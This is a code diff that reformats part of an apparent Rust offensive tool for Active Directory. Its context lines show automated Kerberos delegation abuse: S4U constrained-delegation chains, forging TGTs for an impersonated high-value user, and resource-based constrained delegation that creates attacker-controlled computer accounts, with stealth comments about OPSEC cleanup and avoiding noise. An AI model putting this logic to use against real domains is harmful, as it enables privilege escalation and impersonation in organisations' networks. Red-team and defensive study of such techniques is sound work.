@@ -153,7 +153,9 @@ pub async fn run_delegation_chain(
     let start = std::time::Instant::now();
     info!(
         "{}",
-        "═══ DELEGATION CHAIN AUTOMATION ═══".bold().bright_magenta()
+        "═══ DELEGATION CHAIN AUTOMATION ═══"
+            .bold()
+            .bright_magenta()
     );
 
     let mut result = DelegationChainResult {
@@ -261,7 +263,10 @@ async fn run_constrained_chain(
 
     for chain in &enum_result.s4u_chains {
         if !chain.success {
-            warn!("  S4U chain failed for {} → {}", chain.source_account, chain.target_spn);
+            warn!(
+                "  S4U chain failed for {} → {}",
+                chain.source_account, chain.target_spn
+            );
             tickets.push(ConstrainedChainTicket {
                 source_account: chain.source_account.clone(),
                 impersonated_user: chain.impersonated_user.clone(),
@@ -365,12 +370,18 @@ async fn run_unconstrained_chain(
 
     for host in &enum_result.vulnerable_hosts {
         if let Some(reachable) = host.is_reachable
-            && !reachable {
+            && !reachable
+        {
             info!("  Skipping unreachable host: {}", host.sam_account_name);
             continue;
         }
 
-        info!("  Targeting unconstrained host: {}", host.dns_hostname.as_deref().unwrap_or(&host.sam_account_name));
+        info!(
+            "  Targeting unconstrained host: {}",
+            host.dns_hostname
+                .as_deref()
+                .unwrap_or(&host.sam_account_name)
+        );
 
         // Step 3: Forge TGT for high-value user (will be cached on target)
         match forge_unconstrained_tgt(hunt_config, host, &chain_config.impersonate_user).await {
@@ -412,7 +423,10 @@ async fn forge_unconstrained_tgt(
     let tgt_data = tgt.ticket.build();
 
     Ok(UnconstrainedTicket {
-        target_host: host.dns_hostname.clone().unwrap_or_else(|| host.sam_account_name.clone()),
+        target_host: host
+            .dns_hostname
+            .clone()
+            .unwrap_or_else(|| host.sam_account_name.clone()),
         user_principal: format!("{}@{}", impersonate_user, hunt_config.domain),
         tgt_data,
         tgt_expiry: format_ticket_expiry(&tgt),
@@ -449,12 +463,16 @@ async fn run_rbcd_chain(
 
     // Step 2: Enumerate computers to find RBCD targets
     let computers = conn.enumerate_computers().await?;
-    info!("    Found {} computers, evaluating for RBCD...", computers.len());
+    info!(
+        "    Found {} computers, evaluating for RBCD...",
+        computers.len()
+    );
 
     let mut rbcd_tickets = Vec::new();
 
     // Step 3: For each computer, attempt RBCD auto-chain
-    for computer in computers.iter().take(3) { // Limit to first 3 to avoid noise
+    for computer in computers.iter().take(3) {
+        // Limit to first 3 to avoid noise
         let target_name = computer.sam_account_name.trim_end_matches('$');
         info!("    Attempting RBCD on {}...", target_name);
 
@@ -462,7 +480,10 @@ async fn run_rbcd_chain(
         let controlled_name = format!("RBCD{:04X}", rand::random::<u16>());
         let controlled_password = format!("P@ssw0rd{}!", hex::encode(rand::random::<[u8; 6]>()));
 
-        match conn.add_computer(&controlled_name, &controlled_password, None).await {
+        match conn
+            .add_computer(&controlled_name, &controlled_password, None)
+            .await
+        {
             Ok(_dn) => {
                 info!("    Created controlled account: {}$", controlled_name);
 
@@ -482,7 +503,10 @@ async fn run_rbcd_chain(
                             controlled_sid: sid_string,
                             target_computer: target_name.to_string(),
                             impersonate_user: chain_config.impersonate_user.clone(),
-                            target_spn: Some(format!("cifs/{}.{}", target_name, hunt_config.domain)),
+                            target_spn: Some(format!(
+                                "cifs/{}.{}",
+                                target_name, hunt_config.domain
+                            )),
                             write_only: false,
                             cleanup: true, // Auto-cleanup for OPSEC
                             controlled_secret: Some(controlled_password.clone()),
@@ -505,9 +529,7 @@ async fn run_rbcd_chain(
                                     .await?;
 
                                     let ticket_expiry = if let Some(end_time) = &tgt.end_time {
-                                        end_time
-                                            .format("%Y-%m-%d %H:%M:%S UTC")
-                                            .to_string()
+                                        end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
                                     } else {
                                         "Unknown".to_string()
                                     };
@@ -548,7 +570,10 @@ async fn run_rbcd_chain(
         }
     }
 
-    info!("    RBCD auto-chain complete: {} successful", rbcd_tickets.len());
+    info!(
+        "    RBCD auto-chain complete: {} successful",
+        rbcd_tickets.len()
+    );
     Ok(rbcd_tickets)
 }
 
